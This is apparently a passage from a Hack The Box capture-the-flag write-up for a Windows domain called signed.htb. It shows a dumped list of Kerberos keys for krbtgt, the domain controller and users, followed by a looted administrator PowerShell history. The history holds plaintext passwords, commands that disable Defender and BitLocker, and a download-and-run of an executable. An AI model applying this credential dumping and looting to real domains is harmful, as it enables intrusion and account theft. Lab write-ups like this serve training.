DC01$:aes256-cts-hmac-sha1-96:8623eb64fad40275f19df58b0fd545af309c9c7da2de6404ca81000b3d5b4eac
DC01$:aes128-cts-hmac-sha1-96:8a765d6884a82ba211429868946f80b7
DC01$:des-cbc-md5:1c73e3621fdc25c4
krbtgt:aes256-cts-hmac-sha1-96:01709b65371e302ec87ad523de26a69042c5111e0abc218796c9215731199984
krbtgt:aes128-cts-hmac-sha1-96:1c86d73c368bc8c5aa92e392c9fc905f
krbtgt:des-cbc-md5:19806bdceaf77a58
SIGNED.HTB\mssqlsvc:aes256-cts-hmac-sha1-96:b3e4580cfd006962cd759325391cccc3cbdb7be5128c170aeb4557023a948db8
SIGNED.HTB\mssqlsvc:aes128-cts-hmac-sha1-96:3bfc0458513dbdf1293ab35f2934ab67
SIGNED.HTB\mssqlsvc:des-cbc-md5:3131763e83bf2fd5
signed.htb\oliver.mills:aes256-cts-hmac-sha1-96:ac4773ea6a3fd021a894932d4934dcae1d1a79d1e48d76fa854925b4d24881ed
signed.htb\oliver.mills:aes128-cts-hmac-sha1-96:23dc5d4cdd37edf7e65fb19bfe062922
signed.htb\oliver.mills:des-cbc-md5:6bce138079adf4e5
signed.htb\emma.clark:aes256-cts-hmac-sha1-96:53e99ed83abb141caa72bbbb814fe9d3cf5d00dc1f1477a1f7efa94b440e7f00
signed.htb\emma.clark:aes128-cts-hmac-sha1-96:280f940c3eb860e0b307e8c9182ca130
signed.htb\emma.clark:des-cbc-md5:b019a1df02ef5225
signed.htb\liam.wright:aes256-cts-hmac-sha1-96:11dc1ea201c0f57d17758e12ac79831e2047a70155fdb395fa5dcac167ba2cd1
signed.htb\liam.wright:aes128-cts-hmac-sha1-96:83014c8575d16416f41292f0d3dafd4b
signed.htb\liam.wright:des-cbc-md5:161cbadaa11a23ea
signed.htb\noah.adams:aes256-cts-hmac-sha1-96:c8f58c1fe899f0c9dda11c3b2e3c939711d7d2ee554cd8bd2f0131608d3be6dd
signed.htb\noah.adams:aes128-cts-hmac-sha1-96:24f44b52061fb7778682e871a99dd4d3
signed.htb\noah.adams:des-cbc-md5:6773c2eac1dc40a1
signed.htb\ava.morris:aes256-cts-hmac-sha1-96:4db765132c548a26a92b2872d3c0312ae3d0b72a1d2047bbdfa088c70194e7e9
signed.htb\ava.morris:aes128-cts-hmac-sha1-96:166b288c426edc588450a93ba2daec0e
signed.htb\ava.morris:des-cbc-md5:4afba1ab9e68b91c
signed.htb\sophia.turner:aes256-cts-hmac-sha1-96:58ce5730d739f92b46f89f71f0fae120055ef6ec05f10d6720304532bc76af94
signed.htb\sophia.turner:aes128-cts-hmac-sha1-96:bfe795e7ce2a57436c91cabddc8f4a22
signed.htb\sophia.turner:des-cbc-md5:abb33ee3ad5d3251
signed.htb\james.morgan:aes256-cts-hmac-sha1-96:adba53127af910fef9a6f0788cdc0342ec9df7e3849e329e633fd4b42cd63a1d
signed.htb\james.morgan:aes128-cts-hmac-sha1-96:52589dcd03e64d3f9fe395ce04d32aa1
signed.htb\james.morgan:des-cbc-md5:3b8fcb9bf489c8ce
signed.htb\mia.cooper:aes256-cts-hmac-sha1-96:dc88f2c5f84e5b369573d5a0c817d6366b1fae177f9cc9e62a8699121a8c89a2
signed.htb\mia.cooper:aes128-cts-hmac-sha1-96:8f6a2a57816ac0c247bcdbf1b26e2a5f
signed.htb\mia.cooper:des-cbc-md5:adcec17c4f8cb9f2
signed.htb\elijah.brooks:aes256-cts-hmac-sha1-96:45d8e8999bda4a00b1cf6e2ec0227155de474c2703cd613d35e7ef80ecc44f12
signed.htb\elijah.brooks:aes128-cts-hmac-sha1-96:0b0fcd4c7246f093b2385a2367d25279
signed.htb\elijah.brooks:des-cbc-md5:dc702a9b706e3758
signed.htb\isabella.evans:aes256-cts-hmac-sha1-96:f45c7ea4e87e8ad0eb4d4e20d37cc80e3654b3233b7a987237a5fb00f59b4124
signed.htb\isabella.evans:aes128-cts-hmac-sha1-96:175a4b07b26cb0b9b77c0a2442719fe3
signed.htb\isabella.evans:des-cbc-md5:6d5d407a16bf1ce5
signed.htb\lucas.murphy:aes256-cts-hmac-sha1-96:7eebf570bc97bbe9dd7bf836bd4d0ae4db1576b454dbc8763b91bd6b6b9cd955
signed.htb\lucas.murphy:aes128-cts-hmac-sha1-96:5cbac0cb31131e8def2e2dd32f3ce31d
signed.htb\lucas.murphy:des-cbc-md5:439897e9e9da02fd
signed.htb\william.johnson:aes256-cts-hmac-sha1-96:ea65afdc948a441d4cc4f269f35890945dbe61f1a397eca5401949b79d1e84ef
signed.htb\william.johnson:aes128-cts-hmac-sha1-96:853f54b292e6eb7567b75adf0886c34e
signed.htb\william.johnson:des-cbc-md5:800219621a8346c7
signed.htb\charlotte.price:aes256-cts-hmac-sha1-96:3f77aeda577d75e7d2c49bca50b49170e8593d3dc0e7c7a48fdf8fdf483f9d28
signed.htb\charlotte.price:aes128-cts-hmac-sha1-96:a875bbe1ff84505419956250904bda19
signed.htb\charlotte.price:des-cbc-md5:1a9bcb5e7952a7e0
signed.htb\henry.bennett:aes256-cts-hmac-sha1-96:287d99ab42939337f67a898be6e3a66b4bf87050d3910cb6bfb3967ba484d47a
signed.htb\henry.bennett:aes128-cts-hmac-sha1-96:d11e547284b672bff5770e26e146736c
signed.htb\henry.bennett:des-cbc-md5:7f454957fd2657ad
signed.htb\amelia.kelly:aes256-cts-hmac-sha1-96:eea88ca1e93b06fec519a4a279fdb2d968784794cb4379000f8e63ec3e252f5e
signed.htb\amelia.kelly:aes128-cts-hmac-sha1-96:3cec4e4def49c528a4b2c1bf89cf8831
signed.htb\amelia.kelly:des-cbc-md5:4f6b34e61a8f5d58
signed.htb\jackson.gray:aes256-cts-hmac-sha1-96:0549dc5102946adafa9b9828126b67bdc25411ebbcc1684c82494ac062e68235
signed.htb\jackson.gray:aes128-cts-hmac-sha1-96:4423a1aef47f268abb8b84c4786d73aa
signed.htb\jackson.gray:des-cbc-md5:4f7a43abcb451a32
signed.htb\harper.diaz:aes256-cts-hmac-sha1-96:9b24cd33bcee1cb47980d79970e60b1f05d8876b9689bceead325457957b2224
signed.htb\harper.diaz:aes128-cts-hmac-sha1-96:cf5fc41d0aaa9fdb3ffb1cb353334b77
signed.htb\harper.diaz:des-cbc-md5:75c2022a8349dcd9
[*] Cleaning up...
```


### Files

```bash
[+] C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
# Domain`
$Domain = "signed.htb"`
`
# Groups`
$Groups = @("HR","IT","Finance","Developers","Support")`
`
foreach ($grp in $Groups) {`
    if (-not (Get-ADGroup -Filter "Name -eq '$grp'" -ErrorAction SilentlyContinue)) {`
        New-ADGroup -Name $grp -GroupScope Global -GroupCategory Security`
    }`
}`
`
# Users: Username, Password, Group`
$Users = @(`
    @{Username="oliver.mills";       Password="!Abc987321$"; Group="HR"},`
    @{Username="emma.clark";         Password="!Xyz654789#"; Group="HR"},`
    @{Username="liam.wright";        Password="!Qwe123789&"; Group="HR"},`
`
    @{Username="noah.adams";         Password="!ItDev456$"; Group="IT"},`
    @{Username="ava.morris";         Password="!ItDev789#"; Group="IT"},`
`
    @{Username="sophia.turner";      Password="!Fin987654$"; Group="Finance"},`
    @{Username="james.morgan";       Password="!Fin123987#"; Group="Finance"},`
    @{Username="mia.cooper";         Password="!Fin456321&"; Group="Finance"},`
`
    @{Username="elijah.brooks";      Password="!Dev123456$"; Group="Developers"},`
    @{Username="isabella.evans";     Password="!Dev789654#"; Group="Developers"},`
    @{Username="lucas.murphy";       Password="!Dev321987&"; Group="Developers"},`
    @{Username="william.johnson";    Password="!ItDev321&"; Group="Developers"},`
`
    @{Username="charlotte.price";    Password="!Sup123456$"; Group="Support"},`
    @{Username="henry.bennett";      Password="!Sup654321#"; Group="Support"},`
    @{Username="amelia.kelly";       Password="!Sup987123&"; Group="Support"},`
    @{Username="jackson.gray";       Password="!Sup321654$"; Group="Support"},`
    @{Username="harper.diaz";        Password="!Sup789321#"; Group="Support"}`
)`
`
foreach ($u in $Users) {`
    if (-not (Get-ADUser -Filter "SamAccountName -eq '$($u.Username)'" -ErrorAction SilentlyContinue)) {`
        New-ADUser -Name $u.Username ``
            -SamAccountName $u.Username ``
            -UserPrincipalName "$($u.Username)@$Domain" ``
            -AccountPassword (ConvertTo-SecureString $u.Password -AsPlainText -Force) ``
            -Enabled $true ``
            -PasswordNeverExpires $true`
`
        Add-ADGroupMember -Identity $u.Group -Members $u.Username`
    }`
}
Invoke-WebRequest -Uri "https://go.microsoft.com/fwlink/?linkid=2215202&clcid=0x409&culture=en-us&country=us" -OutFile "C:\Windows\Tasks\SQL2022-SSEI-Expr.exe"
C:\Windows\Tasks\SQL2022-SSEI-Expr.exe
cd \
dir
cd .\SQL2022\
dir
cd .\Evaluation_ENU\
dir
.\SETUP.EXE /ACTION=Install
get-service -Name MSSQLSERVER
New-NetFirewallRule -DisplayName "SQL Server TCP 1433" -Direction Inbound -Protocol TCP -LocalPort 1433 -Action Allow -Profile any
get-service -Name MSSQLSERVER
Set-Service mssqlserver -StartupType automatic
get-service -Name MSSQLSERVER
Start-Service mssqlserver
whoami /all
secedit /export /cfg C:\windows\tasks\cur.inf
notepad C:\windows\tasks\cur.inf
secedit /configure /db C:\Windows\Security\local.sdb /cfg C:\windows\tasks\cur.inf /areas USER_RIGHTS
sc.exe privs MSSQLSERVER SeChangeNotifyPrivilege/SeCreateGlobalPrivilege/SeIncreaseWorkingSetPrivilege/SeIncreaseQuotaPrivilege
Restart-Service mssqlserver
$zone = "DC=signed.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=signed,DC=htb"`
$account = Get-ADUser mssqlsvc`
`
$acl = Get-ACL "AD:$zone"`
$identity = New-Object System.Security.Principal.NTAccount($account.SamAccountName)`
`
$rights = [System.DirectoryServices.ActiveDirectoryRights]"GenericAll"`
$inheritance = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::All`
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity,$rights,"Allow",$inheritance)`
`
$acl.AddAccessRule($ace)`
Set-ACL -ACLObject $acl "AD:$zone"
Enable-PSRemoting -Force
$FQDN = "dc01.signed.htb"`
$cert = New-SelfSignedCertificate -DnsName $FQDN -CertStoreLocation Cert:\LocalMachine\My -KeyExportPolicy Exportable -FriendlyName "WinRM HTTPS $FQDN" -NotAfter (Get-Date).AddYears(5)`
$thumb = ($cert.Thumbprint).Replace(" ","")`
winrm create winrm/config/Listener?Address=*+Transport=HTTPS "@{Hostname=`"$FQDN`";CertificateThumbprint=`"$thumb`"}"
try { winrm delete winrm/config/Listener?Address=*+Transport=HTTP } catch {}
Set-Item -Path WSMan:\localhost\Client\TrustedHosts -Value * -Force`
netsh advfirewall firewall add rule name="WinRM over HTTPS (5986)" dir=in action=allow protocol=TCP localport=5986`
Restart-Service WinRM -Force
netstat -ano -p tcp
winrm enumerate winrm/config/listener
winrm get winrm/config
New-NetFirewallRule -DisplayName "Allow RDP - Any IP" ``
    -Direction Inbound ``
    -Protocol TCP ``
    -LocalPort 3389 ``
    -Action Allow ``
    -Profile Any ``
    -Enabled True ``
    -Description "Allow RDP access from any IP address (testing only)"
Set-NetFirewallProfile -Profile Domain,Public,Private -DefaultInboundAction Block -DefaultOutboundAction Allow
New-NetFirewallRule -DisplayName "Allow DNS - Domain Only" ``
    -Direction Inbound ``
    -Protocol UDP ``
    -LocalPort 53 ``
    -Action Allow ``
    -Profile Any ``
    -Description "Allow DNS queries from domain network"
Get-NetFirewallRule -Direction Inbound | Where-Object {$_.DisplayName -notlike "Allow *"} | Disable-NetFirewallRule
New-NetFirewallRule -DisplayName "Allow MSSQL - Any IP" ``
    -Direction Inbound ``
    -Protocol TCP ``
    -LocalPort 1433 ``
    -Action Allow ``
    -Enabled True ``
    -Profile Any ``
    -Description "Allow MSSQL access from any IP address"
ls \users\
cd .\Desktop\
notepad root.txt
notepad C:\Users\mssqlsvc\Desktop\user.txt
dir
cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'
dir
cd \windows\takss
cd C:\windows\Tasks\
dir
del *
dir
cd \
dir
cd users
cd .\Administrator\Desktop\
notepad cleanup.ps1
cls
$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -File C:\Users\Administrator\Documents\cleanup.ps1"`
$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15) -RepetitionDuration (New-TimeSpan -Days 365)`
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable`
Register-ScheduledTask -TaskName "Clean_DNS_Task" -Action $Action -Trigger $Trigger -Settings $Settings -User "SIGNED\Administrator" -Password "Welcome1"
cd ..\Documents\
notepad restart.ps1
explorer .
dir ..\Desktop\
move ..\Desktop\cleanup.ps1 .
dir ..\Desktop\
dir
Get-NetConnectionProfile
Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString "Th1s889Rabb!t" -AsPlainText -Force) -Reset
Set-Service TermService -StartupType disabled
exit
Get-NetConnectionProfile
nltest /dsgetdc:signed.htb
wusa /uninstall /kb:5065428
iwr http://10.10.11.90:81/vmt.exe -O vmt.exe
iwr http://10.10.14.62:81/vmt.exe -O vmt.exe
.\vmt.exe
del .\vmt.exe
manage-bde -off c:\
disable-bitlocker -mountpoint c:\
powershell iwr https://catalog.s.download.windowsupdate.com/c/msdownload/update/software/secu/2024/06/windows10.0-kb5039217-x64_bc72f4ed75c6dd7bf033b823f79533d5772769a3.msu -O update.msu
.\update.msu
del .\update.msu
dir
iwr https://catalog.s.download/windowsupdate.com/c/msdownload/update/software/secu/2025/05/windows10.0-kb5058392-x64_2881b28817b6e714e61b61a50de9f68605f02bd2.msu -O updates.exe
iwr https://catalog.s.download.windowsupdate.com/c/msdownload/update/software/secu/2025/05/windows10.0-kb5058392-x64_2881b28817b6e714e61b61a50de9f68605f02bd2.msu -O updates.exe
.\updates.exe.exe
.\updates.exe
move .\updates.exe .\updates.msu
.\updates.msu
del .\updates.msu
```


### Client side activities


#### Keylogging & Clipboard history

```bash

```


#### Browser

```bash

```


#### Files & directories access history

```bash

```


#### Application history

```bash

```